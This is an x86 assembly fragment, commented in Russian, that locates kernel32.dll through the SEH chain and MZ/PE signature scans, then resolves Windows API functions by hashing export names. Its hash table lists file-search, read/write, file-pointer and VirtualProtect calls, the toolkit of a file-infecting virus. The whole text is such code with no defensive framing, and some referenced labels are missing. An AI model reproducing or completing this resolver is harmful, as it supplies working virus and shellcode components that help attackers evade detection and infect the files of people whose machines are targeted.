; Читаем SEH
ReadSEH:
    xor    edx, edx              ; edx = 0
    assume fs:flat
    mov    eax, fs:[edx]         ; читаем элемент SEH
    dec    edx                   ; edx = 0FFFFFFFFh

; Ищем элемент со значением 0FFFFFFFFh
SearchKernel32:
    cmp    [eax], edx            ; сравниваем очередной с 0FFFFFFFFh
    je     CheckKernel32         ; прыгаем, если нашли
    mov    eax, [eax]            ; получаем следующее значение
    jmp    SearchKernel32        ; если не нашли - ищем дальше

; Определяем адрес Kernel32
CheckKernel32:
    mov    eax, [eax + 4]        ; получаем адрес ГДЕ-ТО в 
                                 ; kernel32.dll
    xor    ax, ax                ; выравниваем полученный адрес

; Ищем сигнатуру MZ
SearchKernelMZ:          
    cmp word ptr [eax], 5A4Dh    ; сверяем сигнатуру MZ
    je  CheckKernelMZ            ; сигнатура верна, переходим на 
                                 ; проверку сигнатуры PE
    sub eax, 10000h              ; если не равна MZ, то ищем дальше
    jmp SearchKernelMZ

; Проверяем сигнатуру PE
CheckKernelMZ:	
    mov  edx, [eax + 3Ch]        ; переходим на PE-заголовок
    cmp  word ptr [eax + edx], 4550h ; сверяем сигнатуру
    jne  exit0                   ; неверная сигнатура, поэтому 
                                 ; выходим
								 
HashTable:
dd 0F867A91Eh ; CloseHandle
dd 03165E506h ; FindFirstFileA
dd 0CA920AD8h ; FindNextFileA
dd 0860B38BCh ; CreateFileA
dd 029C4EF46h ; ReadFile
dd 0CC17506Ch ; GlobalAlloc
dd 0AAC2523Eh ; GetFileSize
dd 07F3545C6h ; SetFilePointer
dd 0F67B91BAh ; WriteFile
dd 03FE8FED4h ; GlobalFree
dd 015F8EF80h ; VirtualProtect
dd 0D66358ECh ; ExitProcess
dd 05D7574B6h ; GetProcAddress
dd 071E40722h ; LoadLibraryA
dd 0E65B28ACh ; FindClose
dd 059B44650h ; GetModuleFileNameA
dd 00709DC94h ; SetCurrentDirectoryA
dd 0D64B001Eh ; FreeLibrary
dw 0FFFFh     ; Признак конца таблицы								 
								 
								 
_SearchAPI:
    mov   esi, [eax + edx + 78h]
    add   esi, eax
    add   esi, 18h
    xchg  eax, ebx
    lodsd                           ; получаем число указателей на имена
    push  eax                       ; [ebp+4*4]
    lodsd                           ; получаем RVA таблицы экспорта
    push  eax                       ; [ebp+4*3]
    lodsd                           ; получаем RVA таблицы указателей на 
                                    ; имена
    push  eax                       ; [ebp+4*2]
    add   eax, ebx
    push  eax                       ; Указатель на таблицу имен 
                                    ; [ebp+4*1]
    lodsd                           ; получим RVA на таблицу ординалов
    push  eax                       ; [ebp]
    mov   edi, [esp+4*5]            ; edi = дельта_смещение
    lea   edi, [edi+HashTable]      ; edi указывает на начало HashTable
    mov   ebp, esp                  ; сохраняем базу стека

_BeginSearch:
    mov   ecx, [ebp+4*4]            ; число имен функций
    xor   edx, edx                  ; здесь хранится порядковый номер 
                                    ; функции (от 0)

_SearchAPIName:          
    mov  esi, [ebp+4*1]
    mov  esi, [esi]
    add  esi, ebx                   ; адрес ASСII-имени очередной API-
                                    ; функции

; подсчет хэш-значения от имени функции
_GetHash:
    xor  eax, eax
    push eax
_CalcHash:
    ror  eax, 7
    xor  [esp],eax
    lodsb
    test al, al
    jnz  _CalcHash
    pop  eax

; хэш подсчитан
OkHash:
    cmp  eax, [edi]                 ; сверяем полученный hash с тем что в 
                                    ; таблице HashTable
    je   _OkAPI                     ; переходим на вычисление адреса функции
    add  dword ptr [ebp+4*1], 4     ; сдвигаемся к другому элементу таблицы 
                                    ; экспорта
    inc  edx
    loop _SearchAPIName 
    jmp  exit0                            

; вычисляем адрес функции
_OkAPI:
    shl  edx, 1                     ; номер функции
    mov  ecx, [ebp]                 ; берем указатель на таблицу ординалов
    add  ecx, ebx
    add  ecx, edx
    mov  ecx, [ecx]
    and  ecx, 0FFFFh
    mov  edx, [ebp+4*3]             ; извлекаем RVA таблицы экспорта
    add  edx, ebx
    shl  ecx, 2
    add  edx, ecx
    mov  edx, [edx]
    add  edx, ebx
    push edx                        ; сохраняем адрес найденной функции в 
                                    ; стеке
    cmp  word ptr [edi+4], 0FFFFh   ; Конец списка?
    je   _Call_API
    add  edi, 4                     ; следующее hash-значение функции

_NextName:
    mov  ecx, [ebp+4*2]             ; восстанавливаем начало таблицы экспорта
    add  ecx, ebx
    mov  [ebp+4*1], ecx             ; Index в таблице имен
    jmp  short _BeginSearch								 